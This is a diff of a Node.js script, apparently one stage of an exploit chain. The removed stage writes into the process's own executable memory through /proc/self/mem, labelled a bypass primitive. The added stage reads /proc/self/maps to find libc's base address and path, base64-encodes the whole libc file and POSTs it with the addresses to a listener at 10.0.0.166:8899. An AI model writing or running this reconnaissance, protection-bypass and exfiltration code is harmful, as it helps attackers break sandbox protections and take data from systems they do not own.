@@ -1,28 +1,24 @@
-// Stage-11: prove /proc/self/mem self-write into own RWX region (UEP bypass primitive).
+// Stage-12: get libc base/path and pull libc for symbol offsets.
 var fs = require('fs');
 var http = require('http');
 function post(o) {
   var b = JSON.stringify(o);
-  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon11', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
+  var req = http.request({ host: '10.0.0.166', port: 8899, path: '/recon12', method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(b) } }, function (r) { });
   req.on('error', function (e) { });
   req.write(b); req.end();
 }
 var out = {};
 try {
   var maps = fs.readFileSync('/proc/self/maps', 'utf8').split('\n');
-  var rwx = null;
-  for (var i = 0; i < maps.length; i++) { if (/rwxp/.test(maps[i])) { rwx = maps[i]; break; } }
-  out.rwx = rwx;
-  if (rwx) {
-    var end = parseInt(rwx.split('-')[1], 16);
-    var addr = end - 64;
-    var fd = fs.openSync('/proc/self/mem', 'r+');
-    var w = new Buffer([0x44, 0x43, 0x42, 0x41]);
-    var nw = fs.writeSync(fd, w, 0, 4, addr);
-    var r = new Buffer(4);
-    var nr = fs.readSync(fd, r, 0, 4, addr);
-    fs.closeSync(fd);
-    out.wrote = nw; out.readback = r.toString('hex'); out.ok = (r.toString('hex') === '41424344');
+  var libcLine = null;
+  for (var i = 0; i < maps.length; i++) { if (/libc-.*\.so|libc\.so\.6/.test(maps[i]) && /r-xp/.test(maps[i])) { libcLine = maps[i]; break; } }
+  out.libcLine = libcLine;
+  if (libcLine) {
+    var base = parseInt(libcLine.split('-')[0], 16);
+    var path = libcLine.trim().split(/\s+/).pop();
+    out.libcBase = base.toString(16); out.libcPath = path;
+    var b = fs.readFileSync(path);
+    out.libcB64 = b.toString('base64');
   }
 } catch (e) { out.err = e.message; }
 post(out);
